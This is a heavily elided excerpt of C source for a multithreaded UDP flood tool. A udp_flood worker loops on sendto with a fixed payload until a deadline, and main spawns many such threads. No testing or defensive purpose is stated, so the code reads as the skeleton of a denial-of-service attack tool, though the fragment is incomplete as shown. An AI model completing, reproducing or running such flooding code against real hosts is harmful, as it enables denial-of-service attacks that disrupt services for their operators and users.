...
void *udp_flood(void *arg) {
    ...
    // Increase socket send buffer size (optional, for performance)
    int sndbuf_size = 65536; // 64 KB
    ...
    while (time(NULL) < end_time && keep_running) {
        ssize_t sent = sendto(sock, global_payload, params->packet_size, 0, 
...
int main(int argc, char *argv[]) {
    ...
    if (!threads || !params) {
        perror("\033[1;31mFailed to allocate memory for threads or params\033[0m");
        free(global_payload);
        free(threads);
        free(params);
        return EXIT_FAILURE;
    ...
    for (int i = 0; i < thread_count; i++) {
        ...
        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            printf("\033[1;31mFailed to create thread %d: %s\033[0m\n", i, strerror(errno));
            break;
        }
        threads_created++;
    }
